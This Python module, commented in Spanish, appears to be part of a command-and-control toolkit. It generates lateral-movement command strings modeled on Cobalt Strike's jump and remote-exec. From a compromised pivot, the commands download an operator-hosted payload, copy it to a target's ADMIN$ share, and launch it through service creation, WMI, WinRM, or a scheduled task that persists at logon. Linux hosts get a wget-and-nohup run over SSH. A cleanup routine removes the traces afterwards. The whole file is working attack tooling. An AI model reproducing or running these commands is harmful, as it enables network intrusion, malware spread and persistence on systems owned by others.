# -*- coding: utf-8 -*-
"""lateral.py — movimiento lateral estilo Cobalt Strike (jump / remote-exec).

Genera cadenas de comandos que se ejecutan EN UN CLIENTE YA COMPROMETIDO
(handler 'shell' del agente) para desplegar el payload en OTRO host. Cuando el
payload arranca, conecta solo al controlador -> aparece como cliente nuevo.

Flujo (mismo espiritu que 'jump' de Cobalt Strike):
  1) el cliente pivote descarga el payload desde el HTTP del operador
  2) lo copia al destino por SMB (ADMIN$)
  3) lo lanza con la tecnica elegida

Tecnicas y su equivalente en Cobalt Strike:
  psexec   -> jump psexec      (SCM: sc create + sc start)
  smbexec  -> remote-exec smb  (servicio que ejecuta cmd)
  wmiexec  -> jump wmi         (WMI Win32_Process.Create)
  winrm    -> jump winrm       (WinRS / PowerShell Remoting)
  schtasks -> persistencia + ejecucion por tarea programada
  ssh      -> hosts Linux
"""

TECNICAS = ["psexec", "smbexec", "wmiexec", "winrm", "schtasks", "ssh"]

INFO = {
    "psexec":   "SCM: sc create/start (deja servicio en el registro)",
    "smbexec":  "servicio que ejecuta cmd (semi-fileless)",
    "wmiexec":  "WMI Win32_Process.Create (sin servicio)",
    "winrm":    "WinRS / PowerShell Remoting (5985/5986)",
    "schtasks": "tarea programada ONLOGON + /run (persiste)",
    "ssh":      "destinos Linux por SSH",
}


def url_payload(host, puerto_http, nombre_exe):
    return f"http://{host}:{puerto_http}/{nombre_exe}"


def copiar(target, url, exe):
    """Descarga el payload en el pivote y lo copia al ADMIN$ del destino."""
    return (f'powershell -NoP -C "iwr -UseBasicParsing \'{url}\' -OutFile $env:TEMP\\{exe}"'
            f' && copy /Y "%TEMP%\\{exe}" "\\\\{target}\\ADMIN$\\{exe}"')


def lanzar(tecnica, target, exe, servicio="JaguarSvc", usuario="", password="",
           url=""):
    """Cadena de lanzamiento remoto. 'url' solo se usa con ssh."""
    if tecnica == "psexec":
        return (f'sc \\\\{target} create {servicio} binPath= "C:\\Windows\\{exe}" start= auto'
                f' && sc \\\\{target} start {servicio}')
    if tecnica == "smbexec":
        return (f'sc \\\\{target} create {servicio} binPath= "cmd /c C:\\Windows\\{exe}" start= auto'
                f' && sc \\\\{target} start {servicio}')
    if tecnica == "wmiexec":
        return f'wmic /node:{target} process call create "C:\\Windows\\{exe}"'
    if tecnica == "winrm":
        cred = f' -u:{usuario} -p:{password}' if usuario else ""
        return f'winrs{cred} -r:{target} "C:\\Windows\\{exe}"'
    if tecnica == "schtasks":
        return (f'schtasks /s {target} /create /tn {servicio} /tr "C:\\Windows\\{exe}" '
                f'/sc ONLOGON /rl HIGHEST /f && schtasks /s {target} /run /tn {servicio}')
    if tecnica == "ssh":
        return (f'ssh {usuario or "root"}@{target} "wget -qO /tmp/{exe} {url} && '
                f'chmod +x /tmp/{exe} && nohup /tmp/{exe} >/dev/null 2>&1 &"')
    raise ValueError(f"tecnica desconocida: {tecnica}")


def comando_completo(tecnica, target, url, exe="Jaguar.exe", servicio="JaguarSvc",
                     usuario="", password=""):
    """Cadena lista para enviar por el handler 'shell' del agente pivote."""
    if tecnica == "ssh":
        return (f'ssh {usuario or "root"}@{target} "wget -qO /tmp/{exe} {url} && '
                f'chmod +x /tmp/{exe} && nohup /tmp/{exe} >/dev/null 2>&1 &"')
    return copiar(target, url, exe) + " && " + lanzar(
        tecnica, target, exe, servicio, usuario, password, url)


def limpiar(tecnica, target, servicio="JaguarSvc"):
    if tecnica in ("psexec", "smbexec"):
        return f'sc \\\\{target} delete {servicio}'
    if tecnica == "schtasks":
        return f'schtasks /s {target} /delete /tn {servicio} /f'
    return ""